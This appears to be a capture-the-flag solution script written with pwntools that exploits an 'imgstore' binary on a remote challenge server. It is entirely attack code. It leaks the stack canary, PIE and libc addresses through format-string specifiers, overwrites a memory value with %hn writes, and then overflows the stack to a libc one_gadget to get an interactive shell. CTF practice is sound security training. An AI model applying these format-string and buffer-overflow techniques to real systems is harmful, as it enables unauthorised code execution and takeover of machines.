#!/usr/bin/env python3



from pwn import *


e = ELF("./imgstore")
#r = process("./imgstore")
libc = ELF("./libc.so.6")
r = remote("imgstore.chal.imaginaryctf.org",1337)


r.sendlineafter(b">>",b"3")
r.sendlineafter(b"Enter book title:",b"%7$x %14$p %17$p %25$p")
r.recvuntil(b" Book title --> ")
leak = r.recvline().strip().split()
random = int("0x" + leak[0].decode(),16) * 0x13f5c223
pie = int(leak[1].decode(),16) - 0x22b0
canary = int(leak[2].decode(),16)
libc_leak = int(leak[3].decode(),16) - libc.sym.__libc_start_main - 243
log.info("The pie base of the process is " + hex(pie) + " The canary token of the process is " + hex(canary) + " The libc base of the process is " + hex(libc_leak))
r.sendlineafter(b"Still interested in selling your book? [y/n]: ",b"y")
#r.sendline(f"%{random & 0xffffffff}c    ".encode() +  b"%11$n   " + p64(pie + 0x6050))
random = random & 0xffffffff
random1 = (random & 0xffff) - 1
random2 = ((random & 0xffff0000) >> 16) - 1
r.sendlineafter(b"Enter book title:",f"%{random1}c ".encode() + b"%10$hn  " + p64(pie + 0x6050))
r.sendlineafter(b"Still interested in selling your book? [y/n]: ",b"y")
r.sendlineafter(b"Enter book title:",f"%{random2}c ".encode() + b"%10$hn  " + p64(pie + 0x6052))
r.sendlineafter(b">",b"A" * 104 + p64(canary) + p64(0) + p64(libc_leak + 0xe3b01))
r.interactive()
